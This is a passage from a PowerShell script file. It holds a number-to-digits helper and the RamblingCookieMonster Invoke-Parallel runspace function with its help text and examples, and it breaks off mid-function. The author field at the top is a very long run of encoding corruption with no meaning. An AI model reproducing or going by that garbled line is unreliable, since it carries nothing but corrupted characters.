            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
            Date: 09.05.2015
            Version: 1.0
    #>
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    $n = $Number
    $numberOfDigits = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10($n))))
    $digits = New-Object -TypeName Byte[] -ArgumentList $numberOfDigits
    for ($i = ($numberOfDigits - 1); $i -ge 0; $i--)
    {
        $digit = $n % 10
        $digits[$i] = $digit
        $n = [math]::Floor($n / 10)
    }
    Write-Output -InputObject $digits
}


# -------------------------------------------
# Function: Invoke-Parallel
# -------------------------------------------
# Author: RamblingCookieMonster
# Source: https://github.com/RamblingCookieMonster/Invoke-Parallel
# Notes: Added "ImportSessionFunctions" to import custom functions from the current session into the runspace pool.
function Invoke-Parallel
{
    <#
            .SYNOPSIS
            Function to control parallel processing using runspaces

            .DESCRIPTION
            Function to control parallel processing using runspaces

            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.
            This behaviour can be changed with parameters.

            .PARAMETER ScriptFile
            File to run against all input objects.  Must include parameter to take in the input object, or use $args.  Optionally, include parameter to take in parameter.  Example: C:\script.ps1

            .PARAMETER ScriptBlock
            Scriptblock to run against all computers.

            You may use $Using:<Variable> language in PowerShell 3 and later.

            The parameter block is added for you, allowing behaviour similar to foreach-object:
            Refer to the input object as $_.
            Refer to the parameter parameter as $parameter

            .PARAMETER InputObject
            Run script against these specified objects.

            .PARAMETER Parameter
            This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder

            Reference this object as $parameter if using the scriptblock parameterset.

            .PARAMETER ImportVariables
            If specified, get user session variables and add them to the initial session state

            .PARAMETER ImportModules
            If specified, get loaded modules and pssnapins, add them to the initial session state

            .PARAMETER Throttle
            Maximum number of threads to run at a single time.

            .PARAMETER SleepTimer
            Milliseconds to sleep after checking for completed runspaces and in a few other spots.  I would not recommend dropping below 200 or increasing above 500

            .PARAMETER RunspaceTimeout
            Maximum time in seconds a single thread can run.  If execution of your code takes longer than this, it is disposed.  Default: 0 (seconds)

            WARNING:  Using this parameter requires that maxQueue be set to throttle (it will be by default) for accurate timing.  Details here:
            http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430

            .PARAMETER NoCloseOnTimeout
            Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out. This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.

            .PARAMETER MaxQueue
            Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate

            If this is equal or less than throttle, there will be a performance impact

            The default value is $throttle times 3, if $runspaceTimeout is not specified
            The default value is $throttle, if $runspaceTimeout is specified

            .PARAMETER LogFile
            Path to a file where we can log results, including run time for each thread, whether it completes, completes with errors, or times out.

            .PARAMETER Quiet
            Disable progress bar.

            .EXAMPLE
            Each example uses Test-ForPacs.ps1 which includes the following code:
            param($computer)

            if(test-connection $computer -count 1 -quiet -BufferSize 16){
            $object = [pscustomobject] @{
            Computer=$computer;
            Available=1;
            Kodak=$(
            if((test-path "\\$computer\c$\users\public\desktop\Kodak Direct View Pacs.url") -or (test-path "\\$computer\c$\documents and settings\all users

            \desktop\Kodak Direct View Pacs.url") ){"1"}else{"0"}
            )
            }
            }
            else{
            $object = [pscustomobject] @{
            Computer=$computer;
            Available=0;
            Kodak="NA"
            }
            }

            $object

            .EXAMPLE
            Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject $(get-content C:\pcs.txt) -runspaceTimeout 10 -throttle 10

            Pulls list of PCs from C:\pcs.txt,
            Runs Test-ForPacs against each
            If any query takes longer than 10 seconds, it is disposed
            Only run 10 threads at a time

            .EXAMPLE
            Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject c-is-ts-91, c-is-ts-95

            Runs against c-is-ts-91, c-is-ts-95 (-computername)
            Runs Test-ForPacs against each

            .EXAMPLE
            $stuff = [pscustomobject] @{
            ContentFile = "windows\system32\drivers\etc\hosts"
            Logfile = "C:\temp\log.txt"
            }

            $computers | Invoke-Parallel -parameter $stuff {
            $contentFile = join-path "\\$_\c$" $parameter.contentfile
            Get-Content $contentFile |
            set-content $parameter.logfile
            }

            This example uses the parameter argument.  This parameter is a single object.  To pass multiple items into the script block, we create a custom object (using a PowerShell v3 language) with properties we want to pass in.

            Inside the script block, $parameter is used to reference this parameter object.  This example sets a content file, gets content from that file, and sets it to a predefined log file.

            .EXAMPLE
            $test = 5
            1..2 | Invoke-Parallel -ImportVariables {$_ * $test}

            Add variables from the current session to the session state.  Without -ImportVariables $Test would not be accessible

            .EXAMPLE
            $test = 5
            1..2 | Invoke-Parallel {$_ * $Using:test}

            Reference a variable from the current session with the $Using:<Variable> syntax.  Requires PowerShell 3 or later. Note that -ImportVariables parameter is no longer necessary.

            .FUNCTIONALITY
            PowerShell Language

            .NOTES
            Credit to Boe Prox for the base runspace code and $Using implementation
            http://learn-powershell.net/2012/05/10/speedy-network-information-query-using-powershell/
            http://gallery.technet.microsoft.com/scriptcenter/Speedy-Network-Information-5b1406fb#content
            https://github.com/proxb/PoshRSJob/

            Credit to T Bryce Yehl for the Quiet and NoCloseOnTimeout implementations

            Credit to Sergei Vorobev for the many ideas and contributions that have improved functionality, reliability, and ease of use

            .LINK
            https://github.com/RamblingCookieMonster/Invoke-Parallel
    #>
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $ScriptFile,

        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportSessionFunctions,

        [switch]$ImportVariables,

        [switch]$ImportModules,

        [int]$Throttle = 20,

        [int]$SleepTimer = 200,

        [int]$RunspaceTimeout = 0,

        [switch]$NoCloseOnTimeout = $false,

        [int]$MaxQueue,

        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$LogFile = 'C:\temp\log.log',

        [switch] $Quiet = $false
    )

    Begin {

        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
        {
            if($RunspaceTimeout -ne 0)
            {
                $script:MaxQueue = $Throttle
            }
            else
            {
                $script:MaxQueue = $Throttle * 3
            }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }

        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules)
        {
            $StandardUserEnv = [powershell]::Create().addscript({
                    #Get modules and snapins in this clean runspace
                    $Modules = Get-Module | Select-Object -ExpandProperty Name
                    $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name

                    #Get variables in this clean runspace
                    #Called last to get vars like $? into session
                    $Variables = Get-Variable | Select-Object -ExpandProperty Name

                    #Return a hashtable where we can access each.
                    @{
                        Variables = $Variables
                        Modules   = $Modules
                        Snapins   = $Snapins
                    }
            }).invoke()[0]

            if ($ImportVariables)
            {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"

